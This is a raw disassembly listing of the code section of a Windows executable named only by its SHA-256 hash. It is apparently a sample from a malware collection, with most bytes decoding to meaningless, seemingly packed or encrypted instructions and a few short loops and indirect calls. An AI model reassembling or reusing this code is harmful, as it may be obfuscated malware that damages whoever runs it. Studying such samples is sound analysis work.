
47159d1b60beaddb8e1a07a4162cc9b3f97b820d4eba1238ca1d4a0f9067c53b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x70710cf7
  40101f:	test   DWORD PTR [esi+0x78787878],edi
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(0)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080ac0
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz int 0xa6
  4010d1:	aam    0xd9
  4010d3:	in     al,dx
  4010d4:	mov    WORD PTR [eax-0x5a5f123e],?
  4010da:	sti    
  4010db:	dec    edx
  4010dc:	test   DWORD PTR [edx],eax
  4010de:	lods   al,BYTE PTR ds:[esi]
  4010df:	add    BYTE PTR [edi+0x69b7ada2],al
  4010e5:	out    0x52,al
  4010e7:	and    eax,0xae37d093
  4010ec:	xor    cl,BYTE PTR es:[ebx-0x5074d11e]
  4010f3:	sbb    DWORD PTR ds:0xdfa17926,0xb93e3bd6
  4010fd:	dec    esp
  4010fe:	stos   DWORD PTR es:[edi],eax
  4010ff:	into   
  401100:	jo     0x341944dc
  401106:	add    bl,BYTE PTR [esi-0x18]
  401109:	xor    al,0xda
  40110b:	jo     0x401134
  40110d:	stc    
  40110e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40110f:	leave  
  401110:	cmp    DWORD PTR [ebp+0x565044d2],ecx
  401116:	scas   al,BYTE PTR es:[edi]
  401117:	inc    edi
  401118:	aam    0x6b
  40111a:	(bad)  
  40111b:	aad    0xf7
  40111d:	shr    BYTE PTR [ecx+0xc],0x21
  401121:	(bad)  
  401122:	xchg   ebx,eax
  401123:	retf   0x2e8f
  401126:	dec    eax
  401127:	aas    
  401128:	int3   
  401129:	xor    BYTE PTR [eax+0x416fd077],bh
  40112f:	inc    esp
  401130:	xor    eax,0xc5c0820e
  401135:	xor    BYTE PTR [ebp+0x4d],bh
  401138:	loope  0x401184
  40113a:	js     0x4010ea
  40113c:	cwde   
  40113d:	aaa    
  40113e:	sub    al,0x85
  401140:	cld    
  401141:	fmul   QWORD PTR [ebx]
  401143:	aas    
  401144:	inc    edx
  401145:	push   ss
  401146:	fdivr  DWORD PTR [eax+ebx*8-0x5e894d18]
  40114d:	inc    ecx
  40114e:	sbb    cl,BYTE PTR [ebx+edx*8+0x263b5160]
  401155:	rcl    BYTE PTR [eax+ecx*4+0x6e],0x60
  40115a:	imul   eax,DWORD PTR [edi],0x7178ac14
  401160:	cs push eax
  401162:	cwde   
  401163:	enter  0x6fc6,0xf5
  401167:	push   esi
  401168:	pop    edx
  401169:	mov    dh,BYTE PTR [edx]
  40116b:	retf   0xb846
  40116e:	in     al,dx
  40116f:	js     0x4011e7
  401171:	sti    
  401172:	shr    dh,cl
  401174:	and    ecx,DWORD PTR [eax-0x23]
  401177:	adc    eax,0x1d2d7c7
  40117c:	dec    esp
  40117d:	mov    eax,ds:0x1a5302e6
  401182:	mov    dh,0xd9
  401184:	adc    al,0xd0
  401186:	ret    0xfe50
  401189:	dec    eax
  40118a:	cwde   
  40118b:	sub    edx,DWORD PTR [ecx]
  40118d:	pop    ebx
  40118e:	sbb    eax,0xee05898e
  401193:	adc    al,BYTE PTR [edi+0xfd65f4e]
  401199:	jmp    DWORD PTR [edi-0x459d44d6]
  40119f:	call   0x1284:0xc61ae3d0
  4011a6:	cmp    al,0x42
  4011a8:	fs dec esp
  4011aa:	clc    
  4011ab:	mov    edx,DWORD PTR [ebx-0x4b408139]
  4011b1:	mov    ?,WORD PTR [edx+0x53238c2a]
  4011b7:	mov    esi,0x27146f93
  4011bc:	arpl   WORD PTR [ecx-0x3b],ax
  4011bf:	out    dx,al
  4011c0:	push   esi
  4011c1:	repnz jmp 0xd87f:0x64673bb2
  4011c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011ca:	pushaw 
  4011cc:	in     al,0x68
  4011ce:	jne    0x40115d
  4011d0:	lods   al,BYTE PTR ds:[esi]
  4011d1:	push   ds
  4011d2:	in     eax,0xc
  4011d4:	jmp    0xdadf:0x738bbfe9
  4011db:	in     eax,0x2b
  4011dd:	shr    BYTE PTR [eax+0x43cb63ca],1
  4011e3:	cld    
  4011e4:	push   ecx
  4011e5:	loopne 0x401208
  4011e7:	out    dx,eax
  4011e8:	mov    ds:0x9e439777,al
  4011ed:	cmp    dh,bl
  4011ef:	out    dx,eax
  4011f0:	mov    dh,0x31
  4011f2:	mov    ch,0x96
  4011f4:	popa   
  4011f5:	or     eax,0x31aef883
  4011fa:	test   eax,0x7d1af5b7
  4011ff:	in     al,0xd4
  401201:	test   eax,0xac0f6461
  401206:	mov    ch,0x8a
  401208:	arpl   WORD PTR [esi],sp
  40120a:	dec    esp
  40120b:	push   ebx
  40120c:	out    0x1a,eax
  40120e:	addr16 mov al,ds:0x86b9
  401212:	aaa    
  401213:	or     DWORD PTR [edi+0x1655fe42],ebp
  401219:	push   eax
  40121a:	mov    esp,0x609e38ab
  40121f:	pop    edx
  401220:	out    0x22,al
  401222:	push   eax
  401223:	inc    ecx
  401224:	mov    bh,0xb
  401226:	dec    ecx
  401227:	out    0xdc,al
  401229:	mov    WORD PTR [ebp-0x18],ss
  40122c:	adc    ecx,edi
  40122e:	fst    QWORD PTR [ecx]
  401230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401231:	jno    0x4011db
  401233:	cmc    
  401234:	adc    ch,ah
  401236:	dec    edx
  401237:	xor    edx,DWORD PTR [esi+0x64]
  40123a:	sub    esi,DWORD PTR [esi+0x1c]
  40123d:	push   esi
  40123e:	shr    ch,cl
  401240:	in     eax,0xbb
  401242:	sub    al,0x20
  401244:	jmp    0x40124b
  401246:	dec    edi
  401247:	scas   al,BYTE PTR es:[edi]
  401248:	ficomp WORD PTR [esi]
  40124a:	fstp   DWORD PTR [esi]
  40124c:	xor    DWORD PTR [ebx-0x1407ed5f],edi
  401252:	repnz aad 0xed
  401255:	repz stc 
  401257:	in     eax,0xac
  401259:	adc    eax,0x8a01a01
  40125e:	push   edx
  40125f:	xchg   ebx,eax
  401260:	add    al,0x6b
  401262:	jne    0x4012bf
  401264:	mov    esi,DWORD PTR ds:0xfee8b322
  40126a:	in     al,dx
  40126b:	cmp    eax,0xf7a6c3b3
  401270:	les    edx,FWORD PTR ds:0xd9882e4d
  401276:	repnz push edi
  401278:	daa    
  401279:	xor    edx,DWORD PTR es:[ebp+0x7f8c5972]
  401280:	stc    
  401281:	fild   QWORD PTR [edx+0x1c]
  401284:	jae    0x401215
  401286:	imul   BYTE PTR [ebp+0x24f2227]
  40128c:	sub    eax,0x4170e022
  401291:	rol    ecx,cl
  401293:	cmp    edx,esp
  401295:	or     ecx,DWORD PTR [edx]
  401297:	jl     0x40126a
  401299:	ja     0x4012eb
  40129b:	jmp    0x40128d
  40129d:	xchg   edi,eax
  40129e:	jge    0x40124e
  4012a0:	xchg   DWORD PTR [edi+0x77cd036],ecx
  4012a6:	ror    BYTE PTR ds:0xa1031e9b,0xe6
  4012ad:	jmp    0xa80d:0x15310041
  4012b4:	inc    edx
  4012b5:	add    BYTE PTR [ebx+0x19880],cl
  4012bb:	add    BYTE PTR [ebx+0x42a7c10d],cl
  4012c1:	add    BYTE PTR [ecx],cl
  4012c3:	or     eax,0x42a76d
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx+0x57],1
  401422:	retf   
  401423:	xor    BYTE PTR [ebx],0xfe
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x4013e2
  40142e:	xor    ecx,DWORD PTR [ebx-0x20]
  401431:	scas   al,BYTE PTR es:[edi]
  401432:	or     cl,bl
  401434:	and    eax,0x52fcae2
  401439:	push   esi
  40143a:	ss pop edx
  40143c:	xchg   BYTE PTR [edx+eax*4-0x35eb0ab7],bh
  401443:	jbe    0x401404
  401445:	enter  0xb288,0x15
  401449:	pop    esi
  40144a:	mov    cl,0xc7
  40144c:	cmp    ah,BYTE PTR [esi-0xc]
  40144f:	into   
  401450:	arpl   bx,di
  401452:	mov    DWORD PTR [eax-0x3],ebx
  401455:	mov    eax,ds:0x10e3256b
  40145a:	not    DWORD PTR ds:0xc272fb86
  401460:	retf   
  401461:	(bad)  
  401462:	icebp  
  401463:	push   ss
  401464:	repnz adc dh,BYTE PTR [ebp+0x6884ee95]
  40146b:	pop    eax
  40146c:	mov    ds:0x6e90eb48,al
  401471:	leave  
  401472:	push   es
  401473:	fcomp  QWORD PTR [ecx-0xb]
  401476:	adc    esp,DWORD PTR [edx+0x28779aef]
  40147c:	test   al,0xb8
  40147e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40147f:	sub    bl,0x7f
  401482:	jbe    0x40140e
  401484:	lock mov BYTE PTR ss:[edi+0x53],dh
  401489:	cld    
  40148a:	in     eax,dx
  40148b:	mov    ah,0xcc
  40148d:	jecxz  0x401471
  40148f:	popf   
  401490:	and    eax,0x2862de60
  401495:	fsub   DWORD PTR [ebx]
  401497:	mov    ?,WORD PTR [ebp+0x420e0af2]
  40149d:	pop    edi
  40149e:	addr16 push esp
  4014a0:	cmp    BYTE PTR [esi],bh
  4014a2:	sbb    al,0xc8
  4014a4:	test   BYTE PTR [ecx-0x28],bh
  4014a7:	add    dh,al
  4014a9:	jge    0x401436
  4014ab:	xchg   bh,al
  4014ad:	and    eax,0xe69e04b7
  4014b2:	mov    al,0x5c
  4014b4:	scas   al,BYTE PTR es:[edi]
  4014b5:	mov    es:0x5e59f228,al
  4014bb:	push   0xffffff93
  4014bd:	fldcw  WORD PTR [edx+eiz*2-0x356192fd]
  4014c4:	cdq    
  4014c5:	out    0x2c,al
  4014c7:	xchg   DWORD PTR [eax-0x2e],ebx
  4014ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014cb:	(bad)  
  4014cc:	loope  0x4014c1
  4014ce:	sbb    BYTE PTR [ebx+0x165e9fef],0xbe
  4014d5:	in     al,0xa5
  4014d7:	jne    0x4014e9
  4014d9:	es mov eax,0x3d019272
  4014df:	ja     0x40154a
  4014e1:	in     al,dx
  4014e2:	int3   
  4014e3:	pop    esi
  4014e4:	cmc    
  4014e5:	into   
  4014e6:	sub    al,0x6f
  4014e8:	repnz loop 0x4014d4
  4014eb:	add    eax,0x70ce379
  4014f0:	mov    DWORD PTR [edx+0x6a9b9883],edi
  4014f6:	icebp  
  4014f7:	sbb    al,0x19
  4014f9:	aam    0xda
  4014fb:	outs   dx,DWORD PTR ds:[esi]
  4014fc:	dec    edx
  4014fd:	aas    
  4014fe:	jae    0x4014ad
  401500:	les    eax,FWORD PTR [eax]
  401502:	or     DWORD PTR ds:0xcd12607,eax
  401508:	icebp  
  401509:	xor    DWORD PTR [ebx],edi
  40150b:	dec    edx
  40150c:	mov    cl,0xde
  40150e:	xchg   esi,eax
  40150f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401510:	ret    
  401511:	clc    
  401512:	ja     0x401527
  401514:	sub    ecx,edi
  401516:	and    DWORD PTR [eax],esi
  401518:	retf   
  401519:	sub    al,0x33
  40151b:	xchg   edi,eax
  40151c:	or     eax,DWORD PTR [esi-0x2a7b36db]
  401522:	xor    eax,0x48283e9c
  401527:	repnz xor BYTE PTR [edx-0x26],al
  40152b:	or     eax,0xb9fe4dfd
  401530:	push   ecx
  401531:	cwde   
  401532:	push   ds
  401533:	je     0x40152b
  401535:	xchg   esi,eax
  401536:	in     eax,0x18
  401538:	lea    ebp,ds:0x2cb24d9f
  40153e:	and    ebx,ecx
  401540:	cmp    DWORD PTR [ecx-0x2d],eax
  401543:	jo     0x4014f7
  401545:	sub    eax,0x11b4971e
  40154a:	in     eax,dx
  40154b:	mov    eax,ds:0x70c1644c
  401550:	cli    
  401551:	xchg   DWORD PTR [ecx-0x3],ecx
  401554:	test   eax,0x21715d90
  401559:	stos   BYTE PTR es:[edi],al
  40155a:	fisttp WORD PTR [edx+0x38]
  40155d:	jle    0x401513
  40155f:	xchg   BYTE PTR [edx+0x3b],dl
  401562:	jns    0x401576
  401564:	cmp    al,0x7f
  401566:	lea    eax,[edx]
  401568:	scas   eax,DWORD PTR es:[edi]
  401569:	mov    ds:0x3d5c5ca7,eax
  40156e:	jae    0x40154d
  401570:	aas    
  401571:	adc    ah,BYTE PTR [ecx+0x78]
  401574:	xchg   esi,eax
  401575:	sub    DWORD PTR [edx-0x2e],esp
  401578:	and    eax,0x4ed07acd
  40157d:	mov    al,0x18
  40157f:	sbb    BYTE PTR [eax+0x1814e916],dh
  401585:	(bad)  
  401586:	pop    esp
  401587:	xor    al,0x24
  401589:	imul   ebx,DWORD PTR [esi-0x73],0x604f0fab
  401590:	xor    ecx,DWORD PTR [ecx-0x4e]
  401593:	inc    ebx
  401594:	mov    ds:0x70f2e6f5,eax
  401599:	cld    
  40159a:	imul   ecx,DWORD PTR ss:[eax-0x15],0xffffffd4
  40159f:	repz je 0x40153a
  4015a2:	gs jns 0x4015b6
  4015a5:	sub    BYTE PTR [ebp+esi*2-0x4b],0xfb
  4015aa:	mov    dl,0x72
  4015ac:	rol    DWORD PTR [ebx+eax*8-0x10],cl
  4015b0:	test   al,0xb1
  4015b2:	mov    ah,0x3c
  4015b4:	inc    eax
  4015b5:	fdivrp st(5),st
  4015b7:	add    BYTE PTR [eax],cl
  4015b9:	jmp    0x40153b
  4015bb:	xor    esi,DWORD PTR [edx]
  4015bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015be:	(bad)  
  4015c0:	xchg   ecx,eax
  4015c1:	gs mov ch,0x48
  4015c4:	mov    ebp,?
  4015c6:	shr    BYTE PTR [edx+0x555cb9d4],0xba
  4015cd:	hlt    
  4015ce:	push   0xffffffe1
  4015d0:	pop    ebx
  4015d1:	in     eax,0x1e
  4015d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015d4:	and    bl,BYTE PTR [ebx+0x3e]
  4015d7:	jmp    0xbcfe:0x3006a401
  4015de:	push   ebx
  4015df:	test   al,0x5
  4015e1:	pminub mm4,QWORD PTR [edx-0xb060107]
  4015e8:	sub    al,0xe9
  4015ea:	loope  0x40161b
  4015ec:	lahf   
  4015ed:	xor    ah,dh
  4015ef:	or     eax,0x61ddb6c8
  4015f4:	add    BYTE PTR [edx],bl
  4015f6:	fsub   QWORD PTR [eax]
  4015f8:	rcr    BYTE PTR [ebp-0x16be1264],0x64
  4015ff:	and    DWORD PTR [esi+0x54d46db0],esp
  401605:	test   eax,0x3991c98c
  40160a:	add    BYTE PTR [eax+0x430b8f2e],cl
  401610:	ret    
  401611:	imul   esi,DWORD PTR [edx],0x95393c0c
  401617:	aam    0xbe
  401619:	frstor [ecx-0x3a]
  40161c:	imul   edx,edx,0xffffffbe
  40161f:	sti    
  401620:	ficom  WORD PTR [ebx-0xd8c706d]
  401626:	js     0x401622
  401628:	ja     0x401645
  40162a:	(bad)  
  40162c:	int    0x4b
  40162e:	ins    DWORD PTR es:[edi],dx
  40162f:	lahf   
  401630:	xor    BYTE PTR [ebx+0x6be2276],dh
  401636:	cmp    BYTE PTR [edx-0x3f],bh
  401639:	or     ebp,ebx
  40163b:	shr    DWORD PTR [edi+0x5788a388],0x6e
  401642:	push   ss
  401643:	dec    ebp
  401644:	or     DWORD PTR [edi],edx
  401646:	push   esi
  401647:	(bad)  
  401648:	retf   0xb400
  40164b:	sbb    al,0x8d
  40164d:	fnstenv [eax+0x1d]
  401650:	hlt    
  401651:	int    0x65
  401653:	imul   esi,DWORD PTR [esp+ebp*1+0x5],0x5bfeb24c
  40165b:	cmp    DWORD PTR [esi],esp
  40165d:	aad    0xf7
  40165f:	jns    0x401637
  401661:	push   0xffffff96
  401663:	daa    
  401664:	lds    ebp,FWORD PTR [eax]
  401666:	clc    
  401667:	cmp    BYTE PTR fs:[esi],0x11
  40166b:	scas   al,BYTE PTR es:[edi]
  40166c:	and    BYTE PTR [ebx],ah
  40166e:	jmp    0x401609
  401670:	jp     0x4016ea
  401672:	fcmovnu st,st(1)
  401674:	leave  
  401675:	outs   dx,DWORD PTR ds:[esi]
  401676:	mov    dh,0x8f
  401678:	rcl    BYTE PTR [ecx-0x7ba8be86],1
  40167e:	push   esp
  40167f:	inc    edi
  401680:	daa    
  401681:	in     al,dx
  401682:	sar    BYTE PTR [ebx+ebx*8+0x42],1
  401686:	hlt    
  401687:	push   cs
  401688:	dec    edi
  401689:	push   esp
  40168a:	xchg   ecx,eax
  40168b:	cli    
  40168c:	sbb    ah,BYTE PTR [eax+0x775bc13f]
  401692:	pop    esp
  401693:	add    eax,0xcae1dd
  401698:	loope  0x40162a
  40169a:	outs   dx,DWORD PTR ds:[esi]
  40169b:	add    DWORD PTR [ebx+0x5d],esp
  40169e:	xchg   esi,eax
  40169f:	add    ch,ah
  4016a1:	stc    
  4016a2:	mov    edx,0xbfdfe25f
  4016a7:	mov    al,0x94
  4016a9:	mov    esi,0x37b001bb
  4016ae:	cmp    eax,0x3581c703
  4016b3:	dec    ebp
  4016b4:	test   al,0x42
  4016b6:	add    ah,bl
  4016b8:	push   ebx
  4016b9:	add    BYTE PTR [eax],al
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7b9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a769,0x42a75d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz xchg ebx,eax
  4016f5:	addr16 in eax,0x3c
  4016f8:	jl     0x4016fd
  4016fa:	js     0x401774
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x401757
  401701:	neg    BYTE PTR [edi]
  401703:	push   0xa32702e6
  401708:	(bad)  
  401709:	sbb    BYTE PTR [ebp-0x71],bh
  40170c:	and    al,0xb0
  40170e:	pop    ebx
  40170f:	add    DWORD PTR [ecx],0x48
  401712:	jmp    0xb1e4:0x8f46bc3e
  401719:	jp     0x4016da
  40171b:	stos   BYTE PTR es:[edi],al
  40171c:	lds    eax,FWORD PTR [edx+0x17]
  40171f:	mov    al,ds:0xfb85951d
  401724:	mov    eax,DWORD PTR [esp+esi*4-0x3647c07]
  40172b:	cmp    DWORD PTR [ecx-0x15bae180],ebx
  401731:	mov    ebp,0xa1a6d454
  401736:	fsubrp st(2),st
  401738:	rep lods eax,DWORD PTR ds:[esi]
  40173a:	sahf   
  40173b:	fmul   QWORD PTR [edx+0x716a2331]
  401741:	ja     0x401715
  401743:	adc    BYTE PTR [esi],bl
  401745:	push   ebx
  401746:	xchg   DWORD PTR [ebp+0x1c87d201],eax
  40174c:	mov    eax,ds:0x1770cd09
  401751:	pop    eax
  401752:	push   ecx
  401753:	and    edi,DWORD PTR [ebx-0x5f]
  401756:	aam    0x5c
  401758:	pusha  
  401759:	sub    al,0xd0
  40175b:	shl    al,cl
  40175d:	add    edx,DWORD PTR [ecx]
  40175f:	push   es
  401760:	sbb    bl,dh
  401762:	iret   
  401763:	fsub   st,st(6)
  401765:	xlat   BYTE PTR cs:[ebx]
  401767:	push   edx
  401768:	add    DWORD PTR [ebx],ecx
  40176a:	pop    eax
  40176b:	ja     0x4016f3
  40176d:	enter  0x4d16,0x29
  401771:	pop    edi
  401772:	xchg   esp,eax
  401773:	test   al,0x63
  401775:	xor    ebp,DWORD PTR ds:0xd7f83d9b
  40177b:	les    ebx,FWORD PTR [ecx]
  40177d:	xchg   edx,eax
  40177e:	and    edi,DWORD PTR [ebx-0xc]
  401781:	mov    eax,0x48db72b6
  401786:	in     al,0x64
  401788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401789:	xor    ch,BYTE PTR [ebp+0x7]
  40178c:	mov    edx,0x9a792719
  401791:	out    0x3b,al
  401793:	fwait
  401794:	dec    esp
  401795:	fiadd  WORD PTR ds:0x51690029
  40179b:	rcl    DWORD PTR [edi],0xda
  40179e:	mov    DWORD PTR [ebp+0x523c8e63],ebx
  4017a4:	into   
  4017a5:	mov    edx,0x954bd786
  4017aa:	mov    eax,ds:0xce1d1352
  4017af:	push   eax
  4017b0:	jae    0x401792
  4017b2:	inc    eax
  4017b3:	add    al,0x7
  4017b5:	push   eax
  4017b6:	pop    eax
  4017b7:	fdivp  st(6),st
  4017b9:	loope  0x4017c7
  4017bb:	xor    ebp,DWORD PTR [ebx+0x21]
  4017be:	fadd   DWORD PTR [edi+0xb51ca22]
  4017c4:	out    0xc6,al
  4017c6:	test   DWORD PTR [eax-0x538de553],ebp
  4017cc:	dec    eax
  4017cd:	retf   
  4017ce:	out    dx,al
  4017cf:	xor    DWORD PTR [esi+edx*4+0x5],0xe05686fa
  4017d7:	push   eax
  4017d8:	sub    al,dl
  4017da:	retf   0x5dae
  4017dd:	lock or DWORD PTR [ebx],ebx
  4017e0:	inc    ebx
  4017e1:	mov    al,0x25
  4017e3:	es cdq 
  4017e5:	call   0x6b244c6c
  4017ea:	jae    0x40178c
  4017ec:	pop    ebp
  4017ed:	mov    ecx,0xe8be4a74
  4017f2:	retf   0xdbd2
  4017f5:	ds mov edx,?
  4017f8:	shl    DWORD PTR [ecx-0x7b],cl
  4017fb:	sub    BYTE PTR [edx+0x2a],dl
  4017fe:	jp     0x4017bb
  401800:	cmp    BYTE PTR [ebx-0x6],al
  401803:	je     0x4017ad
  401805:	into   
  401806:	mov    cl,0x85
  401808:	mov    ds:0x7fcecd8d,al
  40180d:	(bad)  
  40180e:	fisttp WORD PTR [edi+0x192c6daf]
  401814:	daa    
  401815:	sub    edi,DWORD PTR [eax+0x2e]
  401818:	adc    dl,BYTE PTR [edi+esi*8]
  40181b:	fmul   DWORD PTR [eax-0x5a]
  40181e:	ins    DWORD PTR es:[edi],dx
  40181f:	xor    ah,BYTE PTR [edi]
  401821:	and    BYTE PTR [ebp+ebp*2+0x38],cl
  401825:	adc    ecx,DWORD PTR [ebx-0x68a91d8e]
  40182b:	sub    BYTE PTR [ebx],al
  40182d:	stos   DWORD PTR es:[edi],eax
  40182e:	rcl    BYTE PTR [ebx-0x44],cl
  401831:	mov    bh,0x49
  401833:	outs   dx,BYTE PTR ds:[esi]
  401834:	mov    bl,bl
  401836:	daa    
  401837:	add    al,0x8
  401839:	jg     0x4017f8
  40183b:	inc    edi
  40183c:	or     al,cl
  40183e:	and    bl,0x8b
  401841:	mov    eax,ds:0xfa205995
  401846:	mov    ds:0x4aaf8f90,al
  40184b:	test   eax,0x5c23a1e0
  401850:	adc    eax,0xd296ab61
  401855:	sub    DWORD PTR [eax+0x7],esi
  401858:	cmp    ah,BYTE PTR [ecx-0x62]
  40185b:	sbb    BYTE PTR [edi+0x68],dl
  40185e:	mov    cl,0xcb
  401860:	xor    al,0x99
  401862:	daa    
  401863:	arpl   cx,sp
  401865:	shl    al,0xfc
  401868:	(bad)  
  401869:	hlt    
  40186a:	mov    esi,0xb170d82a
  40186f:	mov    bl,0x47
  401871:	aas    
  401872:	or     ebx,DWORD PTR [esi]
  401874:	xlat   BYTE PTR ds:[ebx]
  401875:	mov    al,0xad
  401877:	(bad)  
  401878:	ss retf 
  40187a:	icebp  
  40187b:	ss mov ebx,0x4fcb903c
  401881:	rol    DWORD PTR [ebx-0x1c],0x6
  401885:	es pop esp
  401887:	lock fidivr WORD PTR [eax-0x3eba73f9]
  40188e:	cmc    
  40188f:	jmp    0xddb8:0xd5a494d3
  401896:	xchg   esi,eax
  401897:	jb     0x40185a
  401899:	push   ebx
  40189a:	xchg   esi,eax
  40189b:	mov    ebx,0x9b443715
  4018a0:	hlt    
